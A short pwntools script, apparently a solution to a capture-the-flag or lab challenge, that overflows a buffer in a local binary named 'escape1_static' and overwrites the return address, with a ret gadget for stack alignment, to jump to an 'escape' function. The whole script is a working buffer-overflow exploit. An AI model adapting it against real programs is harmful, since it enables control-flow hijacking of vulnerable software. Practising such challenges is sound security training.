from pwn import *

# Delivering payload into local binary
binary = context.binary = ELF('./escape1_static')
p = process(binary.path) 

# Payload Crafting
buffer = b"A" * 16
padding = b"B" * 8
return_address = 0x04014f5
# MOVAPS Stack Alignment Issue
alignment_address = 0x4015e6
payload = buffer + padding + p64(alignment_address) + p64(return_address)  
p.sendline(payload)
pause()

p.interactive()

# payload = buffer + padding + p64(alignment_address) + p64(binary.sym.escape)
